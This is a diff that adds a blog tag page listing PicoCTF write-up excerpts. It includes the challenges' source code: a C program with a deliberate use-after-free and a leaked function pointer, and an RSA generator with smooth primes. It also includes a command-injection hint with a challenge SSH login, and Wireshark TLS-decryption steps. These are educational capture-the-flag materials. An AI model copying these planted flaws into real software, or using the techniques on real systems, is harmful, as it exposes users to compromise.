@@ -1,0 +1,652 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/picoctf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>PicoCTF | SBK Hugo Site</title>
+<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/picoctf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/picoctf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
+<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
+<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
+<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
+<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
+<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
+<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
+<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
+<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
+<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
+<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
+<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
+<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
+<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
+<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
+<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
+<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
+<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/>PicoCTF - Unsubscriptions Are Free</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---unsubscriptions-are-free>PicoCTF - Unsubscriptions Are Free
+<a class=anchor href=#picoctf---unsubscriptions-are-free>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>Heap Exploitation / Used After Free</p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;ctype.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define FLAG_BUFFER 200
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define LINE_BUFFER_SIZE 20
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>	uintptr_t (<span style=color:#f92672>*</span>whatToDo)();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>username;
+</span></span><span style=display:flex><span>} cmd;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> choice;
+</span></span><span style=display:flex><span>cmd <span style=color:#f92672>*</span>user;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hahaexploitgobrrr</span>(){
+</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>char</span> buf[FLAG_BUFFER];
+</span></span><span style=display:flex><span> 	FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span> 	fgets(buf,FLAG_BUFFER,f);
+</span></span><span style=display:flex><span> 	fprintf(stdout,<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,buf);
+</span></span><span style=display:flex><span> 	fflush(stdout);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>getsline</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>	getchar();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> line <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>100</span>), <span style=color:#f92672>*</span> linep <span style=color:#f92672>=</span> line;
+</span></span><span style=display:flex><span>	size_t lenmax <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>, len <span style=color:#f92672>=</span> lenmax;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> c;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(line <span style=color:#f92672>==</span> NULL)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> NULL;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(;;) {
+</span></span><span style=display:flex><span>		c <span style=color:#f92672>=</span> fgetc(stdin);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(c <span style=color:#f92672>==</span> EOF)
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#f92672>--</span>len <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>			len <span style=color:#f92672>=</span> lenmax;
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> linen <span style=color:#f92672>=</span> realloc(linep, lenmax <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(linen <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>				free(linep);
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> NULL;
+</span></span><span style=display:flex><span>			}
+</span></span><span style=display:flex><span>			line <span style=color:#f92672>=</span> linen <span style=color:#f92672>+</span> (line <span style=color:#f92672>-</span> linep);
+</span></span><span style=display:flex><span>			linep <span style=color:#f92672>=</span> linen;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>((<span style=color:#f92672>*</span>line<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> c) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#f92672>*</span>line <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> linep;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doProcess</span>(cmd<span style=color:#f92672>*</span> obj) {
+</span></span><span style=display:flex><span>	(<span style=color:#f92672>*</span>obj<span style=color:#f92672>-&gt;</span>whatToDo)();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>s</span>(){
+</span></span><span style=display:flex><span> 	printf(<span style=color:#e6db74>&#34;OOP! Memory leak...%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,hahaexploitgobrrr);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Thanks for subsribing! I really recommend becoming a premium member!&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>p</span>(){
+</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;Membership pending... (There&#39;s also a super-subscription you can also get for twice the price!)&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>m</span>(){
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Account created.&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>leaveMessage</span>(){
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;I only read premium member messages but you can &#34;</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;try anyways:&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> msg <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, msg, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>i</span>(){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> response;
+</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;You&#39;re leaving already(Y/N)?&#34;</span>);
+</span></span><span style=display:flex><span>	scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>response);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(toupper(response)<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;Y&#39;</span>){
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Bye!&#34;</span>);
+</span></span><span style=display:flex><span>		free(user);
+</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Ok. Get premium membership please!&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>printMenu</span>(){
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Welcome to my stream! ^W^&#34;</span>);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;==========================&#34;</span>);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(S)ubscribe to my channel&#34;</span>);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(I)nquire about account deletion&#34;</span>);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(M)ake an Twixer account&#34;</span>);
+</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(P)ay for premium membership&#34;</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(l)eave a message(with or without logging in)&#34;</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(e)xit&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>processInput</span>(){
+</span></span><span style=display:flex><span>  scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>  choice <span style=color:#f92672>=</span> toupper(choice);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span>(choice){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;S&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(user){
+</span></span><span style=display:flex><span> 		user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)s;
+</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Not logged in!&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;P&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)p;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;I&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)i;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;M&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)m;
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;===========================&#34;</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Registration: Welcome to Twixer!&#34;</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Enter your username: &#34;</span>);
+</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>username <span style=color:#f92672>=</span> getsline();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;L&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	leaveMessage();
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;E&#39;</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Invalid option!&#34;</span>);
+</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	  <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
+</span></span><span style=display:flex><span>	setbuf(stdout, NULL);
+</span></span><span style=display:flex><span>	user <span style=color:#f92672>=</span> (cmd <span style=color:#f92672>*</span>)malloc(<span style=color:#66d9ef>sizeof</span>(user));
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>){
+</span></span><span style=display:flex><span>		printMenu();
+</span></span><span style=display:flex><span>		processInput();
+</span></span><span style=display:flex><span>		<span style=color:#75715e>//if(user){
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			doProcess(user);
+</span></span><span style=display:flex><span>		<span style=color:#75715e>//}
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/>PicoCTF - Very Smooth</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/crypto/>Crypto</a></div><p><h1 id=picoctf---very-smooth>PicoCTF - Very Smooth
+<a class=anchor href=#picoctf---very-smooth>#</a></h1><h6 id=tags-picoctf-ctf-crypto>tags: <code>PicoCTF</code> <code>CTF</code> <code>Crypto</code>
+<a class=anchor href=#tags-picoctf-ctf-crypto>#</a></h6><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-1>$p-1$ Smooth</a></p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-python=" data-lang="python=">#!/usr/bin/python
+
+from binascii import hexlify
+from gmpy2 import *
+import math
+import os
+import sys
+
+if sys.version_info &lt; (3, 9):
+    math.gcd = gcd
+    math.lcm = lcm
+
+_DEBUG = False
+
+FLAG  = open(&#39;flag.txt&#39;).read().strip()
+FLAG  = mpz(hexlify(FLAG.encode()), 16)
+SEED  = mpz(hexlify(os.urandom(32)).decode(), 16)
+STATE = random_state(SEED)
+
+def get_prime(state, bits):
+    return next_prime(mpz_urandomb(state, bits) | (1 &lt;&lt; (bits - 1)))
+
+def get_smooth_prime(state, bits, smoothness=16):
+    p = mpz(2)
+    p_factors = [p]
+    while p.bit_length() &lt; bits - 2 * smoothness:
+        factor = get_prime(state, smoothness)
+        p_factors.append(factor)
+        p *= factor
+
+    bitcnt = (bits - p.bit_length()) // 2
+
+    while True:
+        prime1 = get_prime(state, bitcnt)
+        prime2 = get_prime(state, bitcnt)
+        tmpp = p * prime1 * prime2
+        if tmpp.bit_length() &lt; bits:
+            bitcnt += 1
+            continue
+        if tmpp.bit_length() &gt; bits:
+            bitcnt -= 1
+            continue
+        if is_prime(tmpp + 1):
+            p_factors.append(prime1)
+            p_factors.append(prime2)
+            p = tmpp + 1
+            break
+
+    p_factors.sort()
+
+    return (p, p_factors)
+
+e = 0x10001
+
+while True:
+    p, p_factors = get_smooth_prime(STATE, 1024, 16)
+    if len(p_factors) != len(set(p_factors)):
+        continue
+    # Smoothness should be different or some might encounter issues.
+    q, q_factors = get_smooth_prime(STATE, 1024, 17)
+    if len(q_factors) != len(set(q_factors)):
+        continue
+    factors = p_factors + q_factors
+    if e not in factors:
+        break
+
+if _DEBUG:
+    import sys
+    sys.stderr.write(f&#39;p = {p.digits(16)}\n\n&#39;)
+    sys.stderr.write(f&#39;p_factors = [\n&#39;)
+    for factor in p_factors:
+        sys.stderr.write(f&#39;    {factor.digits(16)},\n&#39;)
+    sys.stderr.write(f&#39;]\n\n&#39;)
+
+    sys.stderr.write(f&#39;q = {q.digits(16)}\n\n&#39;)
+    sys.stderr.write(f&#39;q_factors = [\n&#39;)
+    for factor in q_factors:
+        sys.stderr.write(f&#39;    {factor.digits(16)},\n&#39;)
+    sys.stderr.write(f&#39;]\n\n&#39;)
+
+n = p * q
+
+m = math.lcm(p - 1, q - 1)
+d = pow(e, -1, m)
+
+c = pow(FLAG, e, n)
+
+print(f&#39;n = {n.digits(10)}&#39;)
+print(f&#39;c = {c.digits(10)}&#39;)
+</code></pre><p>:::</p><a href=/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---vne/>PicoCTF - VNE</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/pwn/>PWN</a>,
+<a href=/tags/ctf/>CTF</a></div><p><h1 id=picoctf---vne>PicoCTF - VNE
+<a class=anchor href=#picoctf---vne>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>System Environment
+Command Injection</p><h2 id=description--hint>Description & Hint
+<a class=anchor href=#description--hint>#</a></h2><p>We&rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named &ldquo;bin&rdquo; once connected. Login as ctf-player with the password, d137d16e</p><ul><li>Hint 1: Have you checked the content of the /root folder</li><li>Hint 2: Find a way to add more instructions to the ls</li></ul><h2 id=source-code>Source Code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA Main Function</p><a href=/security/practice/picoctf/pwn/picoctf---vne/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/misc/flow/picoctf---webnet0/>PicoCTF - WebNet0</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/misc/>Misc</a></div><p><h1 id=picoctf---webnet0>PicoCTF - WebNet0
+<a class=anchor href=#picoctf---webnet0>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://blog.csdn.net/walleva96/article/details/106844033>解密TLS協議全記錄之利用wireshark解密</a></p><h2 id=recon>Recon
+<a class=anchor href=#recon>#</a></h2><p>這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了</p><h2 id=exploit---tls-decrypt>Exploit - TLS Decrypt
+<a class=anchor href=#exploit---tls-decrypt>#</a></h2><ol><li>在<code>Edit/Preferences/RSA Keys/</code>中<code>Add new keyfile</code>
+<img src=https://hackmd.io/_uploads/ByMdwwSe6.png alt></li><li>加入題目給的private key file後記得要重新開啟該pcap file
